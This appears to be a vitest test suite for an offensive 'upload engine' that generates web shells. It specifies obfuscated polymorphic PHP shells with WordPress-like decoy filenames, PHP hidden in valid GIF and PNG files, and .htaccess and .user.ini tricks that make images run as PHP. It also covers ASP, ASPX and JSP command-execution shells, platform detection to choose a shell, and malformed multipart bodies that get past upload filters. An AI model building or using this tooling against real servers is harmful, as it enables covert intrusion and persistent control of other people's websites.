import { describe, it, expect } from "vitest";
import {
  generatePolymorphicShell,
  generateHtaccessPhpExec,
  generateUserIni,
  generateSteganographyShell,
  generatePngSteganographyShell,
  generateManipulatedMultipart,
  generateAspShell,
  generateAspxShell,
  generateJspShell,
  generateMultiPlatformShells,
  detectServerPlatform,
} from "./enhanced-upload-engine";
import type { ServerPlatform, MultiPlatformShell } from "./enhanced-upload-engine";

describe("Enhanced Upload Engine", () => {
  describe("generatePolymorphicShell", () => {
    it("should generate a valid polymorphic shell with password", () => {
      const result = generatePolymorphicShell("testpassword123");
      expect(result.password).toBe("testpassword123");
      expect(result.code).toContain("<?php");
      expect(result.code).toContain("?>");
      expect(result.filename).toMatch(/\.php$/);
      expect(result.obfuscationMethod).toBeTruthy();
    });

    it("should generate random password if none provided", () => {
      const result = generatePolymorphicShell();
      expect(result.password.length).toBe(20);
      expect(result.password).toMatch(/^[a-zA-Z0-9]+$/);
    });

    it("should generate unique shells each time (polymorphic)", () => {
      const shell1 = generatePolymorphicShell("same_password");
      const shell2 = generatePolymorphicShell("same_password");
      // Filenames should be different (random prefix)
      expect(shell1.filename).not.toBe(shell2.filename);
    });

    it("should use one of the 8 obfuscation methods", () => {
      const validMethods = [
        "base64_nested", "xor_dynamic", "str_rot13_chain",
        "variable_function", "create_function_alt", "preg_replace_e",
        "assert_eval", "array_map_eval",
      ];
      const result = generatePolymorphicShell();
      expect(validMethods).toContain(result.obfuscationMethod);
    });

    it("should generate filename with legitimate-looking prefix", () => {
      const result = generatePolymorphicShell();
      // Should start with a WordPress-like prefix
      const validPrefixes = [
        "wp-cache", "wp-cron-", "class-wp-", "wp-load-", "admin-ajax-",
        "cache-handler", "session-", "config-", "db-repair-", "upgrade-",
        "maintenance-", "health-check-", "object-cache-", "advanced-cache-",
        "sunrise-", "db-error-", "install-helper-", "recovery-mode-",
      ];
      const matchesPrefix = validPrefixes.some(p => result.filename.startsWith(p));
      expect(matchesPrefix).toBe(true);
    });
  });

  describe("generateHtaccessPhpExec", () => {
    it("should generate valid .htaccess content", () => {
      const content = generateHtaccessPhpExec();
      expect(content).toContain("AddType application/x-httpd-php");
      expect(content).toContain("SetHandler application/x-httpd-php");
      expect(content).toContain(".jpg");
      expect(content).toContain(".gif");
      expect(content).toContain(".png");
      expect(content).toContain("php_flag engine on");
    });
  });

  describe("generateUserIni", () => {
    it("should generate valid .user.ini content", () => {
      const content = generateUserIni();
      expect(content).toContain("upload_max_filesize");
      expect(content).toContain("max_execution_time");
      expect(content).toContain("allow_url_fopen = On");
    });
  });

  describe("generateSteganographyShell (GIF)", () => {
    it("should generate a valid GIF89a with embedded PHP", () => {
      const result = generateSteganographyShell("test_pwd");
      expect(result.content).toBeInstanceOf(Buffer);
      // Check GIF89a magic bytes
      expect(result.content[0]).toBe(0x47); // G
      expect(result.content[1]).toBe(0x49); // I
      expect(result.content[2]).toBe(0x46); // F
      expect(result.content[3]).toBe(0x38); // 8
      expect(result.content[4]).toBe(0x39); // 9
      expect(result.content[5]).toBe(0x61); // a
      expect(result.filename).toMatch(/\.gif$/);
      expect(result.contentType).toBe("image/gif");
      // Should contain the password in the embedded PHP
      expect(result.content.toString()).toContain("test_pwd");
    });
  });

  describe("generatePngSteganographyShell", () => {
    it("should generate a valid PNG with embedded PHP", () => {
      const result = generatePngSteganographyShell("test_pwd");
      expect(result.content).toBeInstanceOf(Buffer);
      // Check PNG signature
      expect(result.content[0]).toBe(0x89);
      expect(result.content[1]).toBe(0x50); // P
      expect(result.content[2]).toBe(0x4E); // N
      expect(result.content[3]).toBe(0x47); // G
      expect(result.filename).toMatch(/\.png$/);
      expect(result.contentType).toBe("image/png");
      // Should contain the password in the tEXt chunk
      expect(result.content.toString()).toContain("test_pwd");
    });
  });

  describe("generateAspShell", () => {
    it("should generate a valid ASP classic shell", () => {
      const result = generateAspShell("test_pwd");
      expect(result.code).toContain("<%");
      expect(result.code).toContain("%>");
      expect(result.code).toContain("test_pwd");
      expect(result.filename).toMatch(/\.asp$/);
      expect(result.platform).toBe("asp");
      expect(result.contentType).toBe("text/asp");
    });

    it("should include command execution", () => {
      const result = generateAspShell("pwd123");
      // All methods use WScript.Shell or Execute for command execution
      expect(result.code).toContain("SHELL_OK");
      expect(result.code).toContain("pwd123");
      // Should contain either WScript.Shell, Execute, or WSCRIPT.SHELL
      const hasExec = result.code.includes("WScript.Shell") || result.code.includes("WSCRIPT.SHELL") || result.code.includes("Execute");
      expect(hasExec).toBe(true);
    });
  });

  describe("generateAspxShell", () => {
    it("should generate a valid ASPX .NET shell", () => {
      const result = generateAspxShell("test_pwd");
      expect(result.code).toContain("<%@ Page");
      expect(result.code).toContain("test_pwd");
      expect(result.filename).toMatch(/\.aspx$/);
      expect(result.platform).toBe("aspx");
      expect(result.contentType).toBe("text/html");
    });

    it("should include .NET code execution capability", () => {
      const result = generateAspxShell("pwd123");
      // ASPX shell uses CSharpCodeProvider for dynamic code compilation/execution
      const hasExec = result.code.includes("CSharpCodeProvider") || result.code.includes("Process") || result.code.includes("Diagnostics");
      expect(hasExec).toBe(true);
      expect(result.code).toContain("SHELL_OK");
    });
  });

  describe("generateJspShell", () => {
    it("should generate a valid JSP shell", () => {
      const result = generateJspShell("test_pwd");
      expect(result.code).toContain("<%@");
      expect(result.code).toContain("test_pwd");
      expect(result.filename).toMatch(/\.jsp$/);
      expect(result.platform).toBe("jsp");
      expect(result.contentType).toBe("text/html");
    });

    it("should include Java runtime execution", () => {
      const result = generateJspShell("pwd123");
      // JSP shell uses ProcessBuilder or Runtime for execution
      const hasExec = result.code.includes("ProcessBuilder") || result.code.includes("Runtime");
      expect(hasExec).toBe(true);
      expect(result.code).toContain("java.io");
    });
  });

  describe("detectServerPlatform", () => {
    it("should detect IIS server as asp/aspx", () => {
      const platforms = detectServerPlatform({ server: "Microsoft-IIS/10.0" });
      expect(platforms).toContain("asp");
      expect(platforms).toContain("aspx");
    });

    it("should detect Apache as php", () => {
      const platforms = detectServerPlatform({ server: "Apache/2.4.41" });
      expect(platforms).toContain("php");
    });

    it("should detect Tomcat as jsp", () => {
      const platforms = detectServerPlatform({ server: "Apache Tomcat/9.0" });
      expect(platforms).toContain("jsp");
    });

    it("should always include php as default", () => {
      const platforms = detectServerPlatform({});
      expect(platforms).toContain("php");
    });

    it("should detect from prescreen data", () => {
      const platforms = detectServerPlatform({}, { technologies: ["ASP.NET"], serverSoftware: "IIS" } as any);
      expect(platforms).toContain("aspx");
    });
  });

  describe("generateMultiPlatformShells", () => {
    it("should generate shells for all requested platforms", () => {
      const shells = generateMultiPlatformShells("test_pwd", ["php", "asp", "aspx", "jsp"]);
      expect(shells.length).toBe(4);
      const platforms = shells.map(s => s.platform);
      expect(platforms).toContain("php");
      expect(platforms).toContain("asp");
      expect(platforms).toContain("aspx");
      expect(platforms).toContain("jsp");
    });

    it("should use the same password for all shells", () => {
      const shells = generateMultiPlatformShells("shared_pwd", ["php", "asp", "jsp"]);
      shells.forEach(s => {
        expect(s.password).toBe("shared_pwd");
      });
    });

    it("should generate unique filenames for each platform", () => {
      const shells = generateMultiPlatformShells("pwd", ["php", "asp", "aspx", "jsp"]);
      const filenames = shells.map(s => s.filename);
      const uniqueFilenames = new Set(filenames);
      expect(uniqueFilenames.size).toBe(filenames.length);
    });
  });

  describe("generateManipulatedMultipart", () => {
    it("should generate long boundary multipart", () => {
      const result = generateManipulatedMultipart("<?php echo 1; ?>", "test.php", "long_boundary");
      expect(result.body).toContain("test.php");
      expect(result.contentType).toContain("multipart/form-data");
      // Boundary should be very long (200+ chars)
      const boundary = result.contentType.split("boundary=")[1];
      expect(boundary.length).toBeGreaterThan(200);
    });

    it("should generate unicode boundary multipart", () => {
      const result = generateManipulatedMultipart("<?php echo 1; ?>", "test.php", "unicode_boundary");
      expect(result.body).toContain("test.php");
      expect(result.contentType).toContain("multipart/form-data");
    });

    it("should generate nested boundary multipart", () => {
      const result = generateManipulatedMultipart("<?php echo 1; ?>", "test.php", "nested_boundary");
      expect(result.body).toContain("test.php");
      expect(result.body).toContain("multipart/mixed");
      // Should have both outer and inner boundaries
      expect(result.body).toContain("Outer");
      expect(result.body).toContain("Inner");
    });

    it("should generate double content-disposition multipart", () => {
      const result = generateManipulatedMultipart("<?php echo 1; ?>", "test.php", "double_content_disposition");
      expect(result.body).toContain("test.php");
      expect(result.body).toContain("safe.jpg");
      // Should have two Content-Disposition headers
      const dispositions = result.body.match(/Content-Disposition/g);
      expect(dispositions?.length).toBe(2);
    });

    it("should generate malformed header multipart", () => {
      const result = generateManipulatedMultipart("<?php echo 1; ?>", "test.php", "malformed_header");
      expect(result.body).toContain("test.php");
      // Should contain tab characters for malformed headers
      expect(result.body).toContain("\t");
    });
  });
});
